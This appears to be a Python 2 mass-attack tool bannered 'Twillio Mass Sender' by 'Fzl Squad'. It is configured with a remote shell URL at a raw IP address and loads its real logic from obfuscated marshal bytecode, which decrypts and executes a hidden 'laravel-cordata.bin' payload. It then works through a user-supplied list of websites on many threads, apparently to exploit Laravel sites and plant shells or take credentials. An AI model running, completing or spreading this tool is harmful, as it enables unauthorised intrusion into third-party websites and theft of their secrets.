# -*- coding: utf-8 -*-
YOUR_SHELL = 'http://139.59.217.183/asu.txt'
TEXT_SHELL = 'idbte4m'
SHELL_SAVE = 'psd.txt'
pid_restore = '.jembood'
DEBUGGING = False

import marshal
exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xfc\x02\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsk\x02\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xda\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00sE\x00\x00\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00\x83\x00\x00Z\x02\x00d\x01\x00d\x02\x00l\x03\x00Z\x03\x00d\x01\x00d\x02\x00l\x04\x00Z\x04\x00d\x03\x00\x84\x00\x00Z\x05\x00e\x05\x00e\x02\x00\x83\x01\x00d\x02\x00\x04Ud\x02\x00S(\x04\x00\x00\x00s\x13\x00\x00\x00laravel-cordata.bini\xff\xff\xff\xffNc\x01\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00sI\x00\x00\x00t\x00\x00j\x01\x00t\x02\x00j\x03\x00|\x00\x00\x83\x01\x00\x83\x01\x00}\x01\x00|\x01\x00j\x04\x00d\x01\x00d\x02\x00\x83\x02\x00}\x01\x00t\x02\x00j\x03\x00t\x00\x00j\x01\x00t\x02\x00j\x03\x00|\x01\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00S(\x03\x00\x00\x00Nt\x06\x00\x00\x00jembutt\x00\x00\x00\x00(\x05\x00\x00\x00t\x04\x00\x00\x00zlibt\n\x00\x00\x00decompresst\x06\x00\x00\x00base64t\t\x00\x00\x00b64decodet\x07\x00\x00\x00replace(\x02\x00\x00\x00t\x04\x00\x00\x00codet\x01\x00\x00\x00k(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x07\x00\x00\x00decrypt\x05\x00\x00\x00s\x06\x00\x00\x00\x00\x01\x18\x01\x12\x01(\x06\x00\x00\x00t\x04\x00\x00\x00opent\x04\x00\x00\x00readt\x04\x00\x00\x00ktlnR\x02\x00\x00\x00R\x04\x00\x00\x00R\t\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x12\x02\x0c\x01\x0c\x01\t\x05(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x02\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x02\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x02\x00\x00\x00s\x02\x00\x00\x00\x0c\x01'''))
if __name__ == '__main__':
	print('''
   ________	_ __  ____		   
			_   _  _   _   ___  ___ _  ___   _____ ___ 
|  __ \    | |   | |     |  ____|             | |
| |__) |_ _| |__ | | ___ | |__   ___  ___ ___ | |__   __ _ _ __
|  ___/ _` | '_ \| |/ _ \|  __| / __|/ __/ _ \| '_ \ / _` | '__|
| |  | (_| | |_) | | (_) | |____\__ \ (_| (_) | |_) | (_| | |
|_|   \__,_|_.__/|_|\___/|______|___/\___\___/|_.__/ \__,_|_|
	Make Life Easier | TWILLIO MASS SENDER! | Fzl Squad 2k20! \n''')
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = raw_input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl # Send Error Biar Lanjut Ke Wxception :v
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = raw_input("websitelist ? ")
				readsplit = open(lists).read().splitlines()
			except:
				print("Wrong input or list not found!")
				exit()
			try:
				numthread = raw_input("threads ? ")
			except:
				print("Wrong thread number!")
				exit()
	pjggs = len(readsplit)
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass
